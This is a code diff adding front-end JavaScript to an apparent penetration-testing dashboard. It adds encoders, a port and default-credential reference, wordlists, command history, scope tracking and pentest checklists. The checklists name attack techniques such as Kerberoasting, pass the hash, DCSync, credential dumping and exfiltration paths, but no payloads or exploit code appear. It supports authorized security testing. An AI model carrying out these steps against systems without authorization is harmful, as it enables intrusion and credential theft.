+    },
+    timestampConvert: (input) => {
+        const trimmed = input.trim();
+        if (/^\d{8,}$/.test(trimmed)) {
+            const ts = parseInt(trimmed);
+            const d = ts > 1e12 ? new Date(ts) : new Date(ts * 1000);
+            return `UTC:   ${d.toUTCString()}\nLocal: ${d.toLocaleString()}\nISO:   ${d.toISOString()}`;
+        }
+        const d = new Date(trimmed || Date.now());
+        if (isNaN(d.getTime())) throw new Error('Invalid date');
+        return `Epoch (s):  ${Math.floor(d.getTime()/1000)}\nEpoch (ms): ${d.getTime()}\nISO:        ${d.toISOString()}\nUTC:        ${d.toUTCString()}`;
+    },
+    regexTest: (input) => {
+        const key = document.getElementById('encode-key')?.value || '.*';
+        const re = new RegExp(key, 'gm');
+        const matches = [];
+        let m;
+        while ((m = re.exec(input)) !== null) {
+            matches.push({ match: m[0], index: m.index, groups: m.slice(1) });
+            if (m[0].length === 0) re.lastIndex++;
+        }
+        if (!matches.length) return 'No matches';
+        return `${matches.length} match(es):\n` + matches.map((m, i) => `[${i}] "${m.match}" at index ${m.index}${m.groups.length ? ' groups: ' + JSON.stringify(m.groups) : ''}`).join('\n');
+    },
+    randomPassword: () => {
+        const len = parseInt(document.getElementById('encode-input')?.value) || 16;
+        const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
+        const arr = new Uint32Array(len);
+        crypto.getRandomValues(arr);
+        return Array.from(arr, v => charset[v % charset.length]).join('');
+    },
+    reverseString: (input) => [...input].reverse().join(''),
+    toUpperCase: (input) => input.toUpperCase(),
+    toLowerCase: (input) => input.toLowerCase(),
+    swapCase: (input) => input.replace(/[a-zA-Z]/g, c => c === c.toUpperCase() ? c.toLowerCase() : c.toUpperCase()),
+    charCount: (input) => {
+        const bytes = new TextEncoder().encode(input).length;
+        return `Characters: ${input.length}\nBytes (UTF-8): ${bytes}\nWords: ${input.trim().split(/\s+/).filter(Boolean).length}\nLines: ${input.split('\n').length}`;
+    },
+    urlParse: (input) => {
+        try {
+            const u = new URL(input);
+            return `Protocol: ${u.protocol}\nHost:     ${u.host}\nHostname: ${u.hostname}\nPort:     ${u.port || '(default)'}\nPathname: ${u.pathname}\nSearch:   ${u.search}\nHash:     ${u.hash}\nOrigin:   ${u.origin}`;
+        } catch { return 'Invalid URL'; }
+    },
+};
+
+// === Port Reference ===
+let activePortCategory = 'all';
+
+function initPorts() {
+    const filterContainer = document.getElementById('port-cat-filters');
+    filterContainer.innerHTML = PORT_CATEGORIES.map(c =>
+        `<button onclick="filterPortCat('${c.id}')" class="port-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${
+            c.id === 'all' ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-emerald-500/10 border border-white/5'
+        }" data-cat="${c.id}">${c.label}</button>`
+    ).join('');
+    renderPorts(PORT_REFERENCE);
+}
+
+function filterPortCat(cat) {
+    activePortCategory = cat;
+    document.querySelectorAll('.port-cat-btn').forEach(b => {
+        const isActive = b.dataset.cat === cat;
+        b.className = `port-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${isActive ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-emerald-500/10 border border-white/5'}`;
+    });
+    filterPorts();
+}
+
+function renderPorts(ports) {
+    document.getElementById('port-count').textContent = ports.length + ' ports';
+    document.getElementById('port-list').innerHTML = ports.map(p => {
+        const vulnClass = p.common_vulns.includes('RCE') || p.common_vulns.includes('CVE') ? 'text-rose-400' : 'text-amber-400/80';
+        const toolLinks = p.tools.split(', ').map(t => `<span class="text-violet-400 hover:text-violet-300 cursor-pointer" onclick="jumpToTool('${escapeAttr(t.trim())}')">${escapeHtml(t.trim())}</span>`).join(', ');
+        return `<tr class="border-b border-white/[0.03] hover:bg-white/[0.03]">
+            <td class="px-2 py-1.5 text-violet-400 font-bold">${p.port}</td>
+            <td class="px-2 py-1.5 text-emerald-400">${escapeHtml(p.service)}</td>
+            <td class="px-2 py-1.5 text-slate-500">${p.protocol}</td>
+            <td class="px-2 py-1.5 text-slate-400">${escapeHtml(p.default_creds)}</td>
+            <td class="px-2 py-1.5 ${vulnClass}">${escapeHtml(p.common_vulns)}</td>
+            <td class="px-2 py-1.5">${toolLinks}</td>
+        </tr>`;
+    }).join('');
+}
+
+function filterPorts() {
+    const q = document.getElementById('port-search')?.value?.toLowerCase() || '';
+    let ports = PORT_REFERENCE;
+    if (activePortCategory !== 'all') ports = ports.filter(p => p.category === activePortCategory);
+    if (q) {
+        ports = ports.filter(p =>
+            p.port.toString().includes(q) || p.service.toLowerCase().includes(q) ||
+            p.common_vulns.toLowerCase().includes(q) || p.tools.toLowerCase().includes(q) ||
+            p.default_creds.toLowerCase().includes(q) || p.protocol.toLowerCase().includes(q)
+        );
+    }
+    renderPorts(ports);
+}
+
+function jumpToTool(toolName) {
+    switchManualTab('execute');
+    const searchInput = document.getElementById('tool-search');
+    if (searchInput) { searchInput.value = toolName; filterTools(); }
+    const match = allTools.find(t => t.name.toLowerCase() === toolName.toLowerCase() || t.id.toLowerCase() === toolName.toLowerCase());
+    if (match) setTimeout(() => selectManualTool(match.id), 200);
+}
+
+// === Wordlist Management ===
+async function loadWordlists() {
+    try {
+        const res = await fetch('/api/wordlists');
+        const data = await res.json();
+        const wordlists = data.wordlists || data.local || [];
+        const presets = data.presets || [];
+
+        let html = '';
+        if (wordlists.length) {
+            html += wordlists.map(w => `
+                <div class="flex items-center gap-2 text-xs px-2 py-1.5 rounded bg-white/[0.02] hover:bg-white/[0.05] group">
+                    <i class="fa-solid fa-file-lines text-amber-400/60 shrink-0"></i>
+                    <span class="text-white truncate flex-1 font-mono">${escapeHtml(w.name || w)}</span>
+                    ${w.size ? `<span class="text-slate-500 text-[10px] shrink-0">${w.size}</span>` : ''}
+                    <button onclick="navigator.clipboard.writeText('${escapeAttr(w.path || w.name || w)}')" class="opacity-0 group-hover:opacity-100 text-slate-400 hover:text-white transition-all" title="Copy path"><i class="fa-solid fa-copy"></i></button>
+                </div>
+            `).join('');
+        }
+
+        if (presets.length) {
+            html += '<div class="text-[10px] text-slate-500 uppercase font-bold mt-3 mb-1">Available for Download</div>';
+            html += presets.map(p => `
+                <div class="flex items-center gap-2 text-xs px-2 py-1.5 rounded bg-white/[0.02] ${p.downloaded ? 'opacity-50' : 'hover:bg-white/[0.05]'}">
+                    <i class="fa-solid fa-cloud-arrow-down text-blue-400/60 shrink-0"></i>
+                    <span class="text-slate-300 truncate flex-1">${escapeHtml(p.name)} <span class="text-slate-500">(${p.entries} entries)</span></span>
+                    ${!p.downloaded ? `<button onclick="downloadPreset('${escapeAttr(p.id)}')" class="px-1.5 py-0.5 bg-blue-600/80 hover:bg-blue-500 text-white rounded text-[10px] transition-colors">Get</button>` : '<span class="text-emerald-400 text-[10px]">\u2713</span>'}
+                </div>
+            `).join('');
+        }
+
+        document.getElementById('wordlist-list').innerHTML = html || '<div class="text-slate-500 text-xs">No wordlists found</div>';
+    } catch(e) {
+        document.getElementById('wordlist-list').innerHTML = '<div class="text-rose-400 text-xs">Failed to load</div>';
+    }
+}
+
+async function downloadPreset(presetId) {
+    try {
+        await fetch(`/api/wordlists/download-preset/${encodeURIComponent(presetId)}`, { method: 'POST' });
+        loadWordlists();
+    } catch(e) { console.error(e); }
+}
+
+async function uploadWordlist(input) {
+    const file = input.files?.[0];
+    if (!file) return;
+    const form = new FormData();
+    form.append('file', file);
+    try {
+        await fetch('/api/wordlists/upload', { method: 'POST', body: form });
+        loadWordlists();
+    } catch(e) { console.error(e); }
+    input.value = '';
+}
+
+async function refreshWordlistOptions() {
+    try {
+        const res = await fetch('/api/wordlists');
+        const data = await res.json();
+        const wordlists = data.wordlists || data.local || [];
+        const dl = document.getElementById('wordlist-options');
+        if (dl) {
+            dl.innerHTML = wordlists.map(w => `<option value="${escapeAttr(w.path || w.name || w)}">`).join('');
+        }
+    } catch(e) { /* ignore */ }
+}
+
 // Init
 document.addEventListener('DOMContentLoaded', () => {
     loadTools();
     showTip();
+    initRevShells();
+    initEncoder();
+    initPorts();
+    loadWordlists();
+    loadChecklist();
+    loadNotes();
+    loadEvidence();
+    initLFI();
+    initSQLi();
+    initPrivEsc();
+    renderADCommands();
+    initEvidenceDragDrop();
+    initClipboardPaste();
 });
+
+// ========== COMMAND HISTORY ==========
+let commandHistory = JSON.parse(localStorage.getItem('spectra_cmd_history') || '[]');
+let historySortKey = 'time';
+let historySortAsc = false;
+
+function addToHistory(entry) {
+    commandHistory.unshift(entry);
+    if (commandHistory.length > 200) commandHistory.pop();
+    localStorage.setItem('spectra_cmd_history', JSON.stringify(commandHistory));
+    renderHistory();
+}
+
+function renderHistory() {
+    const search = (document.getElementById('history-search')?.value || '').toLowerCase();
+    const toolFilter = document.getElementById('history-tool-filter')?.value || '';
+
+    // Populate tool filter dropdown
+    const toolSelect = document.getElementById('history-tool-filter');
+    const tools = [...new Set(commandHistory.map(h => h.tool))];
+    const currentVal = toolSelect.value;
+    toolSelect.innerHTML = '<option value="">All tools</option>' + tools.map(t => `<option value="${t}">${t}</option>`).join('');
+    toolSelect.value = currentVal;
+
+    let filtered = commandHistory.filter(h => {
+        if (toolFilter && h.tool !== toolFilter) return false;
+        if (search && !h.tool.toLowerCase().includes(search) && !h.target.toLowerCase().includes(search) && !(h.output||'').toLowerCase().includes(search)) return false;
+        return true;
+    });
+
+    // Sort
+    filtered.sort((a, b) => {
+        let va, vb;
+        if (historySortKey === 'time') { va = new Date(a.time); vb = new Date(b.time); }
+        else if (historySortKey === 'tool') { va = a.tool; vb = b.tool; }
+        else if (historySortKey === 'status') { va = a.status ? 1 : 0; vb = b.status ? 1 : 0; }
+        else if (historySortKey === 'duration') { va = a.duration; vb = b.duration; }
+        else { va = a[historySortKey]; vb = b[historySortKey]; }
+        if (va < vb) return historySortAsc ? -1 : 1;
+        if (va > vb) return historySortAsc ? 1 : -1;
+        return 0;
+    });
+
+    document.getElementById('history-list').innerHTML = filtered.slice(0, 50).map((h, i) => {
+        const t = new Date(h.time);
+        const timeStr = t.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
+        const statusIcon = h.status ? '<span class="text-emerald-400">&#10003;</span>' : '<span class="text-rose-400">&#10007;</span>';
+        const dur = h.duration ? h.duration.toFixed(1) + 's' : '-';
+        return `<tr class="border-b border-white/[0.03] hover:bg-white/[0.03] text-xs">
+            <td class="px-3 py-1.5 text-slate-400 font-mono">${timeStr}</td>
+            <td class="px-3 py-1.5 text-violet-400">${escapeHtml(h.tool)}</td>
+            <td class="px-3 py-1.5 text-white font-mono truncate max-w-[150px]">${escapeHtml(h.target)}</td>
+            <td class="px-3 py-1.5">${statusIcon}</td>
+            <td class="px-3 py-1.5 text-slate-400 font-mono">${dur}</td>
+            <td class="px-3 py-1.5 text-right">
+                <button onclick="viewHistoryOutput(${i})" class="px-1.5 py-0.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-[10px] transition-colors mr-1">View</button>
+                <button onclick="rerunFromHistory(${i})" class="px-1.5 py-0.5 bg-violet-600/60 hover:bg-violet-500 text-white rounded text-[10px] transition-colors">Re-run</button>
+            </td>
+        </tr>`;
+    }).join('') || '<tr><td colspan="6" class="px-3 py-4 text-center text-slate-500 text-xs">No history yet</td></tr>';
+}
+
+function sortHistory(key) {
+    if (historySortKey === key) historySortAsc = !historySortAsc;
+    else { historySortKey = key; historySortAsc = true; }
+    renderHistory();
+}
+
+function filterHistory() { renderHistory(); }
+
+function toggleHistoryPanel() {
+    const panel = document.getElementById('history-panel');
+    const chevron = document.getElementById('history-chevron');
+    panel.classList.toggle('hidden');
+    chevron.classList.toggle('rotate-180');
+    if (!panel.classList.contains('hidden')) renderHistory();
+}
+
+function viewHistoryOutput(idx) {
+    const h = commandHistory[idx];
+    if (!h) return;
+    showModal('Output: ' + h.tool + ' → ' + h.target, `<pre class="text-xs text-slate-300 font-mono whitespace-pre-wrap p-4 max-h-[60vh] overflow-y-auto">${colorizeOutput(escapeHtml(h.output || '(no output)'))}</pre>` +
+        (h.stderr ? `<pre class="text-xs text-amber-500/70 font-mono whitespace-pre-wrap p-4 border-t border-white/5">${escapeHtml(h.stderr)}</pre>` : ''));
+}
+
+function rerunFromHistory(idx) {
+    const h = commandHistory[idx];
+    if (!h) return;
+    switchManualTab('execute');
+    selectManualTool(h.toolId || h.tool.toLowerCase());
+    setTimeout(() => {
+        const targetInput = document.getElementById('arg-target');
+        if (targetInput) targetInput.value = h.target;
+        executeManualTool();
+    }, 400);
+}
+
+// ========== DIFF MODAL ==========
+function openDiffModal() {
+    if (commandHistory.length < 2) { alert('Need at least 2 command runs to compare'); return; }
+    const options = commandHistory.slice(0, 50).map((h, i) => {
+        const t = new Date(h.time).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
+        return `<option value="${i}">${t} - ${h.tool} → ${h.target}</option>`;
+    }).join('');
+
+    showModal('Compare Outputs', `
+        <div class="p-4">
+            <div class="flex gap-4 mb-4">
+                <div class="flex-1"><label class="text-[10px] text-slate-500 uppercase font-bold">Left</label>
+                    <select id="diff-left" class="w-full px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white focus:outline-none">${options}</select></div>
+                <div class="flex-1"><label class="text-[10px] text-slate-500 uppercase font-bold">Right</label>
+                    <select id="diff-right" class="w-full px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white focus:outline-none"><option value="1" selected>${commandHistory.length > 1 ? '' : ''}</option>${options}</select></div>
+            </div>
+            <button onclick="runDiff()" class="px-4 py-2 bg-violet-600 hover:bg-violet-500 text-white rounded text-xs mb-3">Compare</button>
+            <div id="diff-output" class="flex gap-2 max-h-[50vh] overflow-y-auto"></div>
+        </div>`, 'max-w-5xl');
+    if (commandHistory.length > 1) document.getElementById('diff-right').value = '1';
+}
+
+function runDiff() {
+    const leftIdx = parseInt(document.getElementById('diff-left').value);
+    const rightIdx = parseInt(document.getElementById('diff-right').value);
+    const left = (commandHistory[leftIdx]?.output || '').split('\n');
+    const right = (commandHistory[rightIdx]?.output || '').split('\n');
+
+    const maxLen = Math.max(left.length, right.length);
+    let leftHtml = '', rightHtml = '';
+    for (let i = 0; i < maxLen; i++) {
+        const l = left[i] || '';
+        const r = right[i] || '';
+        if (l === r) {
+            leftHtml += `<div class="diff-unchanged px-2">${escapeHtml(l)}</div>`;
+            rightHtml += `<div class="diff-unchanged px-2">${escapeHtml(r)}</div>`;
+        } else {
+            leftHtml += `<div class="diff-del px-2">${l ? '-' + escapeHtml(l) : '&nbsp;'}</div>`;
+            rightHtml += `<div class="diff-add px-2">${r ? '+' + escapeHtml(r) : '&nbsp;'}</div>`;
+        }
+    }
+    document.getElementById('diff-output').innerHTML = `
+        <div class="flex-1 bg-black rounded-lg overflow-auto font-mono text-[11px] leading-5 p-2">${leftHtml}</div>
+        <div class="flex-1 bg-black rounded-lg overflow-auto font-mono text-[11px] leading-5 p-2">${rightHtml}</div>`;
+}
+
+// ========== MODAL SYSTEM ==========
+function showModal(title, content, widthClass) {
+    const existing = document.getElementById('spectra-modal');
+    if (existing) existing.remove();
+    const modal = document.createElement('div');
+    modal.id = 'spectra-modal';
+    modal.className = 'modal-overlay';
+    modal.onclick = (e) => { if (e.target === modal) modal.remove(); };
+    modal.innerHTML = `<div class="modal-content ${widthClass || 'max-w-3xl'} w-full">
+        <div class="flex items-center justify-between px-4 py-3 border-b border-white/10">
+            <h3 class="text-sm font-bold text-white">${title}</h3>
+            <button onclick="document.getElementById('spectra-modal').remove()" class="text-slate-400 hover:text-white"><i class="fa-solid fa-xmark"></i></button>
+        </div>
+        <div>${content}</div>
+    </div>`;
+    document.body.appendChild(modal);
+}
+
+// ========== SCOPE MANAGEMENT ==========
+let scopeTargets = JSON.parse(localStorage.getItem('spectra_scope_targets') || '[]');
+let scopeExclusions = JSON.parse(localStorage.getItem('spectra_scope_exclusions') || '[]');
+
+function toggleScopePanel() {
+    document.getElementById('scope-panel').classList.toggle('open');
+    renderScopeTargets();
+    renderScopeExclusions();
+}
+
+function addScopeTarget() {
+    const type = document.getElementById('scope-target-type').value;
+    const value = document.getElementById('scope-target-value').value.trim();
+    const notes = document.getElementById('scope-target-notes').value.trim();
+    if (!value) return;
+    scopeTargets.push({type, value, notes});
+    localStorage.setItem('spectra_scope_targets', JSON.stringify(scopeTargets));
+    document.getElementById('scope-target-value').value = '';
+    document.getElementById('scope-target-notes').value = '';
+    renderScopeTargets();
+}
+
+function removeScopeTarget(idx) {
+    scopeTargets.splice(idx, 1);
+    localStorage.setItem('spectra_scope_targets', JSON.stringify(scopeTargets));
+    renderScopeTargets();
+}
+
+function renderScopeTargets() {
+    const icons = {ip:'fa-network-wired text-blue-400', domain:'fa-globe text-emerald-400', url:'fa-link text-violet-400'};
+    document.getElementById('scope-targets-list').innerHTML = scopeTargets.map((t, i) =>
+        `<div class="flex items-center gap-2 text-xs px-2 py-1.5 rounded bg-white/[0.02]">
+            <i class="fa-solid ${icons[t.type] || 'fa-circle text-slate-400'} text-[10px]"></i>
+            <span class="text-[10px] text-slate-500 uppercase w-12">${t.type}</span>
+            <span class="text-white font-mono flex-1 truncate">${escapeHtml(t.value)}</span>
+            <span class="text-slate-500 text-[10px] truncate max-w-[100px]">${escapeHtml(t.notes)}</span>
+            <button onclick="removeScopeTarget(${i})" class="text-slate-600 hover:text-rose-400 transition-colors"><i class="fa-solid fa-xmark"></i></button>
+        </div>`
+    ).join('') || '<div class="text-slate-500 text-[10px] py-1">No targets defined</div>';
+}
+
+function addScopeExclusion() {
+    const type = document.getElementById('scope-excl-type').value;
+    const value = document.getElementById('scope-excl-value').value.trim();
+    const reason = document.getElementById('scope-excl-reason').value.trim();
+    if (!value) return;
+    scopeExclusions.push({type, value, reason});
+    localStorage.setItem('spectra_scope_exclusions', JSON.stringify(scopeExclusions));
+    document.getElementById('scope-excl-value').value = '';
+    document.getElementById('scope-excl-reason').value = '';
+    renderScopeExclusions();
+}
+
+function removeScopeExclusion(idx) {
+    scopeExclusions.splice(idx, 1);
+    localStorage.setItem('spectra_scope_exclusions', JSON.stringify(scopeExclusions));
+    renderScopeExclusions();
+}
+
+function renderScopeExclusions() {
+    document.getElementById('scope-exclusions-list').innerHTML = scopeExclusions.map((e, i) =>
+        `<div class="flex items-center gap-2 text-xs px-2 py-1.5 rounded bg-rose-500/5">
+            <i class="fa-solid fa-ban text-rose-400 text-[10px]"></i>
+            <span class="text-[10px] text-slate-500 uppercase w-12">${e.type}</span>
+            <span class="text-rose-300 font-mono flex-1 truncate">${escapeHtml(e.value)}</span>
+            <span class="text-slate-500 text-[10px] truncate max-w-[100px]">${escapeHtml(e.reason)}</span>
+            <button onclick="removeScopeExclusion(${i})" class="text-slate-600 hover:text-rose-400 transition-colors"><i class="fa-solid fa-xmark"></i></button>
+        </div>`
+    ).join('') || '<div class="text-slate-500 text-[10px] py-1">No exclusions defined</div>';
+}
+
+function saveScope() {
+    localStorage.setItem('spectra_scope_roe', document.getElementById('scope-roe').value);
+    alert('Scope saved to session');
+}
+
+// ========== CHECKLISTS ==========
+const CHECKLIST_DATA = {
+    owasp: {name:'OWASP Top 10', categories: [
+        {name:'A01: Broken Access Control', items:['Test horizontal privilege escalation','Test vertical privilege escalation','Test IDOR vulnerabilities','Test missing function level access control','Check CORS misconfiguration','Test directory traversal','Verify JWT token validation']},
+        {name:'A02: Cryptographic Failures', items:['Check for sensitive data in transit (TLS)','Check for weak cipher suites','Test for sensitive data exposure in URLs','Check password storage (hashing algorithm)','Test for insecure cookies (Secure/HttpOnly flags)']},
+        {name:'A03: Injection', items:['Test SQL injection (all input fields)','Test NoSQL injection','Test LDAP injection','Test OS command injection','Test XSS (reflected, stored, DOM-based)','Test template injection (SSTI)','Test header injection']},
+        {name:'A04: Insecure Design', items:['Review authentication flow','Test rate limiting','Check for insecure direct object references','Review business logic flaws','Test for race conditions']},
+        {name:'A05: Security Misconfiguration', items:['Check default credentials','Review HTTP security headers','Test for directory listing','Check error handling (stack traces)','Review CORS policy','Test for unnecessary HTTP methods','Check for debug mode/endpoints']},
+        {name:'A06: Vulnerable Components', items:['Identify all frameworks/libraries','Check for known CVEs in dependencies','Test for outdated software versions','Review third-party integrations']},
+        {name:'A07: Auth Failures', items:['Test brute force protection','Test password policy enforcement','Test session management','Test multi-factor authentication bypass','Check session timeout/fixation','Test logout functionality','Test remember me functionality']},
+        {name:'A08: Data Integrity', items:['Check for insecure deserialization','Verify software update mechanisms','Test CI/CD pipeline security','Check for unsigned/unverified data']},
+        {name:'A09: Logging & Monitoring', items:['Verify security events are logged','Check log injection prevention','Test alerting mechanisms','Review log retention policy']},
+        {name:'A10: SSRF', items:['Test for SSRF in URL parameters','Test for SSRF in file upload','Test for SSRF via webhooks','Check for internal service enumeration']},
+    ]},
+    network: {name:'Network Pentest', categories: [
+        {name:'Reconnaissance', items:['DNS enumeration','Subdomain discovery','Port scanning (TCP full)','Port scanning (UDP top 100)','Service version detection','OS fingerprinting','SNMP enumeration','SMB enumeration']},
+        {name:'Vulnerability Assessment', items:['Run Nuclei templates','Run Nessus/OpenVAS scan','Check for default credentials','Test SSL/TLS configuration','Check for known CVEs','Test for misconfigurations']},
+        {name:'Exploitation', items:['Attempt default credential login','Test for known exploits (searchsploit)','Test for buffer overflows','SQL injection on web services','Test for command injection']},
+        {name:'Post-Exploitation', items:['Escalate privileges','Dump credentials/hashes','Lateral movement','Persistence mechanisms','Data exfiltration paths','Clean up artifacts']},
+    ]},
+    api: {name:'API Security', categories: [
+        {name:'Authentication', items:['Test API key security','Test OAuth flow','Test JWT implementation','Test rate limiting on auth endpoints','Test password reset flow','Check for broken authentication']},
+        {name:'Authorization', items:['Test BOLA/IDOR','Test broken function level auth','Test object property level auth','Test mass assignment','Test for privilege escalation']},
+        {name:'Input Validation', items:['Test for injection (SQL, NoSQL, command)','Test for XSS in API responses','Test request size limits','Test content-type validation','Test for XXE in XML parsers']},
+        {name:'Data Exposure', items:['Check for excessive data exposure','Review error messages','Check for sensitive data in logs','Test for information disclosure in headers']},
+    ]},
+    ad: {name:'Active Directory', categories: [
+        {name:'Initial Enumeration', items:['Enumerate domain controllers','Enumerate domain users','Enumerate domain groups','Enumerate GPOs','Check for null sessions','Enumerate shares','Check for AS-REP roastable accounts']},
+        {name:'Credential Attacks', items:['Kerberoasting','AS-REP Roasting','Password spraying','NTLM relay','Pass the hash','Pass the ticket','Golden ticket','Silver ticket']},
+        {name:'Privilege Escalation', items:['Check for misconfigured ACLs','Check for unconstrained delegation','Check for constrained delegation','Abuse GenericAll/GenericWrite','Abuse Group Policy','Check for LAPS','DCSync attack']},
+        {name:'Lateral Movement', items:['PSExec','WMI execution','WinRM','DCOM execution','RDP hijacking','Named pipe impersonation']},
+    ]},
+    ptes: {name:'PTES', categories: [
+        {name:'Pre-engagement', items:['Define scope','Get written authorization','Establish communication channels','Define rules of engagement','Emergency contacts']},
+        {name:'Intelligence Gathering', items:['OSINT reconnaissance','Active DNS enumeration','Email harvesting','Technology fingerprinting','Social media review']},
+        {name:'Threat Modeling', items:['Identify assets','Identify threat actors','Map attack surface','Prioritize attack vectors']},
+        {name:'Vulnerability Analysis', items:['Automated scanning','Manual verification','Research public exploits','False positive elimination']},
+        {name:'Exploitation', items:['Exploit identified vulnerabilities','Confirm impact','Document exploitation steps','Capture evidence']},
+        {name:'Post-Exploitation', items:['Privilege escalation','Lateral movement','Data access assessment','Persistence testing']},
+        {name:'Reporting', items:['Executive summary','Technical findings','Remediation recommendations','Evidence compilation']},
+    ]},
+};
+
+let checklistState = {};
+
+function loadChecklist() {
+    const method = document.getElementById('checklist-methodology').value;
+    const data = CHECKLIST_DATA[method];
+    if (!data) return;
+
+    const stateKey = 'spectra_checklist_' + method;
+    checklistState = JSON.parse(localStorage.getItem(stateKey) || '{}');
+
+    const container = document.getElementById('checklist-content');
+    container.innerHTML = data.categories.map((cat, ci) => {
+        const completed = cat.items.filter((_, ii) => checklistState[ci + '-' + ii]).length;
+        return `<div class="border border-white/5 rounded-lg overflow-hidden">
+            <button onclick="toggleAccordion(this)" class="w-full flex items-center justify-between px-4 py-3 bg-slate-800/50 hover:bg-slate-800 text-left transition-colors">
+                <span class="text-sm font-medium text-white">${escapeHtml(cat.name)}</span>
+                <span class="flex items-center gap-2">
+                    <span class="text-[10px] text-slate-500">${completed}/${cat.items.length}</span>
+                    <i class="fa-solid fa-chevron-down text-[10px] text-slate-500 transition-transform"></i>
+                </span>
+            </button>
+            <div class="accordion-content${ci === 0 ? ' open' : ''}">
+                <div class="p-3 space-y-1">
+                    ${cat.items.map((item, ii) => {
+                        const key = ci + '-' + ii;
+                        const checked = checklistState[key];
+                        const toolMatches = item.match(/\b(nmap|nuclei|nikto|gobuster|sqlmap|hydra|searchsploit|whatweb|wpscan|feroxbuster|dirsearch|ffuf|crackmapexec|enum4linux|impacket|kerbrute|testssl)\b/gi) || [];
+                        const toolBadges = toolMatches.map(t => `<button onclick="event.stopPropagation();jumpToTool('${t.toLowerCase()}')" class="px-1.5 py-0.5 bg-violet-500/10 hover:bg-violet-500/20 text-violet-400 rounded text-[9px] transition-colors">${t}</button>`).join('');
+                        return `<div class="checklist-item ${checked ? 'completed' : ''} flex items-start gap-2 px-2 py-1.5 rounded hover:bg-white/[0.03] group">
+                            <input type="checkbox" ${checked ? 'checked' : ''} onchange="toggleChecklistItem('${method}','${key}',this)" class="mt-0.5 accent-emerald-500 shrink-0">
+                            <span class="checklist-text text-xs text-slate-200 flex-1">${escapeHtml(item)}</span>
+                            <div class="flex gap-1 shrink-0">${toolBadges}</div>
+                            <button onclick="toggleChecklistNotes(this)" class="text-slate-600 hover:text-slate-400 text-[10px] opacity-0 group-hover:opacity-100 transition-opacity shrink-0" title="Notes"><i class="fa-solid fa-note-sticky"></i></button>
+                        </div>
+                        <div class="checklist-notes hidden px-8 pb-1">
+                            <textarea placeholder="Notes..." rows="2" class="w-full px-2 py-1 bg-slate-900/60 border border-white/10 rounded text-[11px] text-white placeholder-slate-600 focus:outline-none resize-none" oninput="saveChecklistNote('${method}','${key}-note',this.value)">${escapeHtml(checklistState[key + '-note'] || '')}</textarea>
+                        </div>`;
+                    }).join('')}
+                </div>
+            </div>
+        </div>`;
+    }).join('');
+    updateChecklistProgress(method);
+}
+
+function toggleAccordion(btn) {
+    const content = btn.nextElementSibling;
+    content.classList.toggle('open');
+    btn.querySelector('i').classList.toggle('rotate-180');
+}
+
+function toggleChecklistItem(method, key, checkbox) {
+    const stateKey = 'spectra_checklist_' + method;
+    checklistState[key] = checkbox.checked;
+    localStorage.setItem(stateKey, JSON.stringify(checklistState));
+    checkbox.closest('.checklist-item').classList.toggle('completed', checkbox.checked);
+    updateChecklistProgress(method);
+}
+
+function toggleChecklistNotes(btn) {
+    btn.closest('.checklist-item').nextElementSibling.classList.toggle('hidden');
+}
+
+function saveChecklistNote(method, key, value) {
+    const stateKey = 'spectra_checklist_' + method;
+    checklistState[key] = value;
+    localStorage.setItem(stateKey, JSON.stringify(checklistState));
+}
+
+function updateChecklistProgress(method) {
+    const data = CHECKLIST_DATA[method];
+    if (!data) return;
+    let total = 0, done = 0;
+    data.categories.forEach((cat, ci) => {
+        cat.items.forEach((_, ii) => {
+            total++;
+            if (checklistState[ci + '-' + ii]) done++;
+        });
+    });
+    const pct = total ? Math.round((done / total) * 100) : 0;
+    document.getElementById('checklist-progress-bar').style.width = pct + '%';
+    document.getElementById('checklist-progress-text').textContent = `${done}/${total} completed (${pct}%)`;
+}
+
+function resetChecklist() {
+    if (!confirm('Reset all checklist progress?')) return;
+    const method = document.getElementById('checklist-methodology').value;
+    checklistState = {};
+    localStorage.removeItem('spectra_checklist_' + method);
+    loadChecklist();
+}
+
+// ========== NOTES ==========
+let notesData = JSON.parse(localStorage.getItem('spectra_notes') || '[]');
+let activeNoteId = null;
+let noteAutoSaveTimer = null;
+
+function loadNotes() { renderNotesList(); }
+
+function createNote() {
+    const note = { id: Date.now().toString(), title: 'Untitled Note', content: '', target_id: '', finding_id: '', updated: new Date().toISOString() };
+    notesData.unshift(note);
+    saveNotesToStorage();
+    activeNoteId = note.id;
+    renderNotesList();
+    showNoteEditor(note);
+}
+
+function renderNotesList() {
+    const filter = document.getElementById('notes-filter')?.value || 'all';
+    let filtered = notesData;
+    if (filter === 'target') filtered = notesData.filter(n => n.target_id);
+    if (filter === 'finding') filtered = notesData.filter(n => n.finding_id);
+
+    const list = document.getElementById('notes-list');
+    if (!filtered.length) {
+        list.innerHTML = '<div class="text-slate-500 text-xs text-center py-4">No notes yet</div>';
+        return;
+    }
+    list.innerHTML = filtered.map(n => {
+        const active = n.id === activeNoteId ? 'note-item active' : '';
+        const date = new Date(n.updated).toLocaleDateString([], {month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
+        return `<div class="${active} border border-white/5 rounded-lg p-2 cursor-pointer hover:bg-white/[0.03] transition-colors" onclick="openNote('${n.id}')">
+            <div class="text-xs text-white font-medium truncate">${escapeHtml(n.title || 'Untitled')}</div>
+            <div class="text-[10px] text-slate-500">${date}</div>
+        </div>`;
+    }).join('');
+}
+
+function filterNotes() { renderNotesList(); }
+
+function openNote(id) {
+    const note = notesData.find(n => n.id === id);
+    if (!note) return;
+    activeNoteId = id;
+    renderNotesList();
+    showNoteEditor(note);
+}
+
+function showNoteEditor(note) {
+    document.getElementById('notes-editor-empty').classList.add('hidden');
+    document.getElementById('notes-editor').classList.remove('hidden');
+    document.getElementById('note-title').value = note.title || '';
+    document.getElementById('note-content').value = note.content || '';
+    document.getElementById('note-target').value = note.target_id || '';
